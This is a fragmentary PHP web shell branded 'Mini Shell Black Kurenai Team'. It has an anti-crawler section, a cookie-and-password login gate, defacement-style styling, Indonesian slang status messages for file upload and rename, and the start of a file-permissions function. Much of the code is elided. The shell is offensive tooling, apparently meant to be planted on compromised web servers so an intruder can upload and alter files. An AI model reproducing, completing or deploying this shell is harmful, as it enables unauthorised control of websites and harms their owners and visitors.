...
/*------------------ End of Anti Crawler -----*/
    ...
    echo "<link href=data:image/gif;https://e.top4top.io/p_2411sg01w1.jpg rel=icon type=image/x-icon />";
    echo "<style>
    html { background:url() black; }
    #loginbox { font-size:7px; color:green; width:1200px; height:200px; background-repeat:repeat ; border:1px solid #4C83AF; background-image:url('https://c.top4top.io/p_2410hf7mu1.jpg'); border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
    ...
    if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        ...
        else
        {
            if($_POST['usrname'])
            {
                print'<script>alert("UserName/PassWord Salah blok,mau nikung yak?:V");</script>';
            }
            echo '<title>Mini Shell Black Kurenai Team</title><center>
            <div id=loginbox><p><font face="Fantasy" size=-1>
            <font color=orange>>>>>>>>>>></font><font color=white>>>>>><<<<<</font><font color=green>>>>>>>>>>></font>
            <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="fantasy"><b>Mini Shell By Black Kurenai Team</b></font></th></tr>
...
<title>Mini Shell Black Kurenai Team</title>
<style>
body{
font-family: "Iceberg";
...
<center><img src="https://e.top4top.io/p_2411sg01w1.jpg" width="400" height="255"></center>
<h1><center><b><font color="aqua" face="fantasy">-=[+] MINI SHELL </font><font color="aqua" face="fantasy"></font> <font color="aqua" face="iceberg">BLACK KURENAI TEAM[+]=-</font></b><br>
			</center></h1>
			<font face="iceberg">
...
echo '<font color="lime">Upload Filenya gagal mek:v!</font><br />';
}else{
echo '<font color="red">Berhasil mek:v</font><br />';
}
}
...
echo '<font color="lime">Gagal blok!</font><br />';
}else{
echo '<font color="red">Berhasil ganti nama:v !</font><br />';
}
...
echo '<br /><center><font color="white"></font><font color="aqua">BLACK KURENAI TEAM</font></center>
</BODY>
</HTML>';
function perms($file){
